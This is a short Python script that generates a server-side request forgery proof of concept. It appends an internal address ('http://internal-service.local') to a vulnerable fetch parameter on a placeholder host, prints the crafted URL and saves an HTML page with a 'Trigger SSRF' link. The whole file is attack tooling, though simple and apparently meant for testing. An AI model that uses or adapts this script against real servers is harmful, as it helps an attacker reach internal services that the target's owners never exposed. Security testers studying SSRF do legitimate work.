def generate_ssrf_poc(target_url, payload_url):
    # Combine the target URL and payload URL to create the SSRF PoC
    ssrf_url = f"{target_url}{payload_url}"
    
    # Print the crafted SSRF URL
    print(f"SSRF PoC URL: {ssrf_url}")
    
    # Generate an HTML file with a clickable link to trigger the SSRF
    html_content = f"""
    <html>
    <body>
        <p>Click the link below to test the SSRF PoC:</p>
        <a href='{ssrf_url}'>Trigger SSRF</a>
    </body>
    </html>
    """
    with open("ssrf_poc.html", "w") as f:
        f.write(html_content)
    print("PoC HTML saved as 'ssrf_poc.html'")

# Example usage
target = "http://vulnerable.com/fetch?url="
payload = "http://internal-service.local"
generate_ssrf_poc(target, payload)
